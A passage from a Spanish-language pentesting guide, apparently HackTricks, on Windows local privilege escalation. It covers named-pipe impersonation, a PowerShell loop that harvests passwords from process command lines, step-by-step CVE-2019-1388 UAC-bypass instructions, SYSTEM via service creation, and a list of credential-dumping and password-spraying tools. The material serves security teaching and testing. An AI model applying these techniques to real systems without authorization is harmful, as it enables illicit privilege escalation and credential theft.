Cuando un **cliente escribe en una tubería**, el **servidor** que creó la tubería puede **impersonar** al **cliente** si tiene privilegios de **SeImpersonate**. Entonces, si puedes encontrar un **proceso privilegiado que va a escribir en cualquier tubería que puedas impersonar**, podrías ser capaz de **escalar privilegios** impersonando ese proceso después de que escriba dentro de tu tubería creada. [**Puedes leer esto para aprender cómo realizar este ataque**](named-pipe-client-impersonation.md) **o** [**esto**](./#from-high-integrity-to-system)**.**

**Además, la siguiente herramienta permite interceptar la comunicación de una tubería con nombre con una herramienta como burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **y esta herramienta permite listar y ver todas las tuberías para encontrar privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)****

## Miscelánea

### **Monitoreo de líneas de comandos para contraseñas**

Cuando se obtiene una shell como usuario, puede haber tareas programadas u otros procesos que se ejecutan que **pasan credenciales en la línea de comandos**. El script a continuación captura las líneas de comandos del proceso cada dos segundos y compara el estado actual con el estado anterior, mostrando cualquier diferencia.
```powershell
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## De usuario con baja privacidad a NT\AUTHORITY SYSTEM (CVE-2019-1388) / Bypass de UAC

Si tienes acceso a la interfaz gráfica (a través de la consola o RDP) y UAC está habilitado, en algunas versiones de Microsoft Windows es posible ejecutar una terminal o cualquier otro proceso como "NT\AUTHORITY SYSTEM" desde un usuario sin privilegios.

Esto hace posible escalar privilegios y evitar UAC al mismo tiempo con la misma vulnerabilidad. Además, no es necesario instalar nada y el binario utilizado durante el proceso está firmado y emitido por Microsoft.

Algunos de los sistemas afectados son los siguientes:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Para explotar esta vulnerabilidad, es necesario realizar los siguientes pasos:

```
1) Haga clic derecho en el archivo HHUPD.EXE y ejecútelo como administrador.

2) Cuando aparezca la ventana de control de cuentas de usuario (UAC), seleccione "Mostrar más detalles".

3) Haga clic en "Mostrar información del certificado del editor".

4) Si el sistema es vulnerable, al hacer clic en el enlace de URL "Emitido por", puede aparecer el navegador web predeterminado.

5) Espere a que el sitio se cargue por completo y seleccione "Guardar como" para abrir una ventana de explorer.exe.

6) En la ruta de dirección de la ventana de explorer, escriba cmd.exe, powershell.exe o cualquier otro proceso interactivo.

7) Ahora tendrá un símbolo del sistema "NT\AUTHORITY SYSTEM".

8) Recuerde cancelar la configuración y la ventana de control de cuentas de usuario (UAC) para volver a su escritorio.
```

Tiene todos los archivos e información necesarios en el siguiente repositorio de GitHub:

https://github.com/jas502n/CVE-2019-1388

## De nivel de integridad de Administrador Medio a Alto / Bypass de UAC

Lea esto para **aprender sobre los Niveles de Integridad**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Luego **lea esto para aprender sobre UAC y los Bypasses de UAC:**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **De Alto a System**

### **Nuevo servicio**

Si ya está ejecutando un proceso de Alto Nivel de Integridad, el **paso a SYSTEM** puede ser fácil simplemente **creando y ejecutando un nuevo servicio**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Desde un proceso de alta integridad, se puede intentar **habilitar las entradas del registro AlwaysInstallElevated** e **instalar** un shell inverso usando un envoltorio _**.msi**_.\
[Más información sobre las claves del registro involucradas y cómo instalar un paquete _.msi_ aquí.](./#alwaysinstallelevated)

### Privilegio High + SeImpersonate a System

**Puede encontrar el código aquí**](seimpersonate-from-high-to-system.md)**.**

### De SeDebug + SeImpersonate a privilegios de token completo

Si tiene esos privilegios de token (probablemente los encontrará en un proceso de alta integridad), podrá **abrir casi cualquier proceso** (no procesos protegidos) con el privilegio SeDebug, **copiar el token** del proceso y crear un **proceso arbitrario con ese token**.\
Usando esta técnica, generalmente se **selecciona cualquier proceso que se ejecute como SYSTEM con todos los privilegios de token** (_sí, puede encontrar procesos de SYSTEM sin todos los privilegios de token_).\
**Puede encontrar un** [**ejemplo de código que ejecuta la técnica propuesta aquí**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Esta técnica es utilizada por meterpreter para escalar en `getsystem`. La técnica consiste en **crear un pipe y luego crear/abusar de un servicio para escribir en ese pipe**. Luego, el **servidor** que creó el pipe usando el privilegio **`SeImpersonate`** podrá **suplantar el token** del cliente del pipe (el servicio) obteniendo privilegios de SYSTEM.\
Si desea [**aprender más sobre los pipes con nombre, debe leer esto**](./#named-pipe-client-impersonation).\
Si desea leer un ejemplo de [**cómo pasar de alta integridad a System usando pipes con nombre, debe leer esto**](from-high-integrity-to-system-with-name-pipes.md).

### Secuestro de DLL

Si logra **secuestrar una DLL** que está siendo **cargada** por un **proceso** que se ejecuta como **SYSTEM**, podrá ejecutar código arbitrario con esos permisos. Por lo tanto, el secuestro de DLL también es útil para este tipo de escalada de privilegios, y, además, es mucho **más fácil de lograr desde un proceso de alta integridad** ya que tendrá **permisos de escritura** en las carpetas utilizadas para cargar DLL.\
**Puede** [**aprender más sobre el secuestro de DLL aquí**](dll-hijacking.md)**.**

### **De Administrador o Network Service a System**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### De LOCAL SERVICE o NETWORK SERVICE a privilegios completos

**Leer:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Más ayuda

[Binarios estáticos de impacket](https://github.com/ropnop/impacket\_static\_binaries)

## Herramientas útiles

**La mejor herramienta para buscar vectores de escalada de privilegios locales de Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Verifique las configuraciones incorrectas y los archivos sensibles (**[**verifique aquí**](../../windows/windows-local-privilege-escalation/broken-reference/)**). Detectado.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Verifique algunas posibles configuraciones incorrectas y recopile información (**[**verifique aquí**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Verifique las configuraciones incorrectas**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrae información de sesión guardada de PuTTY, WinSCP, SuperPuTTY, FileZilla y RDP. Use -Thorough en local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrae credenciales del Administrador de credenciales. Detectado.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Rocíe contraseñas recopiladas en todo el dominio**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh es una herramienta de suplantación de ADIDNS/LLMNR/mDNS/NBNS de PowerShell y de hombre en el medio.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumeración básica de Windows para privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Busque vulnerabilidades de privesc conocidas (DEPRECATED para Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Verificaciones locales **(Necesita derechos de administrador)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Busque vulnerabilidades de privesc conocidas (debe compilarse usando VisualStudio) ([**precompilado**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera el host buscando configuraciones incorrectas (más una herramienta de recopilación de información que de privesc) (debe compilarse) **(**[**precompilado**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrae credenciales de muchos programas (exe precompilado en github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port de PowerUp a C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Verifique las configuraciones incorrectas (ejecutable precompilado en github). No recomendado. No funciona bien en Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Verifique las posibles configuraciones incorrectas (exe de python). No recomendado. No funciona bien en Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Herramienta creada en base a este post (no necesita accesschk para funcionar correctamente, pero puede usarlo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lee la salida de **systeminfo** y recomienda exploits que funcionan (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lee la salida de **systeminfo** y recomienda exploits que funcionan (python local)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

Debe compilar el proyecto usando la versión correcta de .NET ([ver esto](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Para ver la versión instalada de .NET en el host víctima, puede hacer:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliografía

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
[http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
[https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
[https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
[https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
[https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
